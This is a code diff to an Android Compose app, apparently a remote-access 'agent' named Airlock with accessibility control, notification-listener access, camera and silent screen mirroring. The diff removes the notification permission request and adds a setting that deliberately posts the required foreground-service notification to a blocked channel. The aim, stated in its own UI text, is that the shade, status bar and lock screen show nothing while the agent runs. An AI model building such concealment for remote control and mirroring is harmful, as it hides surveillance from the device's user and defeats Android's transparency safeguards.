@@ -57,7 +57,6 @@ import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
-import androidx.core.app.NotificationManagerCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.Lifecycle
 import androidx.lifecycle.LifecycleEventObserver
@@ -123,7 +122,6 @@ private fun AgentScreen() {
         tick++
     }
 
-    val notifications = remember(tick) { notificationsEnabled(context) }
     val accessibility = remember(tick) { KeyAccessibilityService.isEnabled(context) }
     val listeners = remember(tick) { notificationAccessEnabled(context) }
     val camera = remember(tick) { granted(context, Manifest.permission.CAMERA) }
@@ -314,15 +312,6 @@ private fun AgentScreen() {
         // ------------------------------------------------------------ permissions
         PanelCard {
             SectionTitle("Permissions")
-            PermissionRow("Notifications", notifications) {
-                if (Build.VERSION.SDK_INT >= 33) {
-                    permissionLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
-                } else {
-                    context.startActivity(Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
-                        putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
-                    })
-                }
-            }
             PermissionRow("Accessibility (touch + keys)", accessibility) {
                 context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
             }
@@ -357,8 +346,8 @@ private fun AgentScreen() {
                 Column(Modifier.weight(1f)) {
                     Text("Silent mode", color = TextMain, fontSize = 13.sp)
                     Text(
-                        "No volume panel, no toasts, no status-bar icon, and the link notification shows no code, IP or lock-screen text. " +
-                            "Remote volume and key errors go to the dashboard instead of this screen.",
+                        "No volume panel, no toasts, no sounds. Remote volume and key errors go to the dashboard " +
+                            "instead of this screen.",
                         color = TextDim,
                         fontSize = 11.sp,
                     )
@@ -370,12 +359,27 @@ private fun AgentScreen() {
                     DeviceService.core?.broadcastHello()
                 }) { Text(if (silent) "on" else "off", color = if (silent) Ok else TextDim) }
             }
+            Spacer(Modifier.height(12.dp))
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Column(Modifier.weight(1f)) {
+                    Text("Link notification", color = TextMain, fontSize = 13.sp)
+                    Text(
+                        "Hidden on purpose: the foreground-service entry is posted to a blocked channel, so the " +
+                            "shade, status bar and lock screen stay empty.",
+                        color = TextDim,
+                        fontSize = 11.sp,
+                    )
+                }
+                TextButton(onClick = { openNotificationSettings(context) }) {
+                    Text("settings", color = TextDim, fontSize = 12.sp)
+                }
+            }
             Spacer(Modifier.height(6.dp))
             Text(
-                "Android always requires a foreground-service entry. Silent mode reduces it to a silent shade line with no " +
-                    "code, IP or lock-screen text. With Accessibility enabled, mirroring is silent too — no “Start recording?” " +
-                    "dialog. On Android 13+ you can deny Notifications to hide the shade line entirely while the agent keeps " +
-                    "running. The green camera/mic privacy dot cannot be suppressed by any app.",
+                "Airlock no longer asks for notification permission. Android still requires the service to post a " +
+                    "notification and may list Airlock in the Task Manager, but no notification is shown. With " +
+                    "Accessibility enabled, mirroring is silent too — no “Start recording?” dialog. The green " +
+                    "camera/mic privacy dot cannot be suppressed by any app.",
                 color = TextDim,
                 fontSize = 11.sp,
             )
@@ -427,8 +431,19 @@ private fun PermissionRow(label: String, granted: Boolean, action: () -> Unit) {
 private fun granted(context: Context, permission: String): Boolean =
     ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
 
-private fun notificationsEnabled(context: Context): Boolean =
-    NotificationManagerCompat.from(context).areNotificationsEnabled()
+private fun openNotificationSettings(context: Context) {
+    val channel = Intent(Settings.ACTION_CHANNEL_NOTIFICATION_SETTINGS).apply {
+        putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
+        putExtra(Settings.EXTRA_CHANNEL_ID, DeviceService.CHANNEL_ID)
+    }
+    try {
+        context.startActivity(channel)
+    } catch (_: Throwable) {
+        context.startActivity(Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
+            putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
+        })
+    }
+}
 
 private fun notificationAccessEnabled(context: Context): Boolean {
     val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners") ?: return false
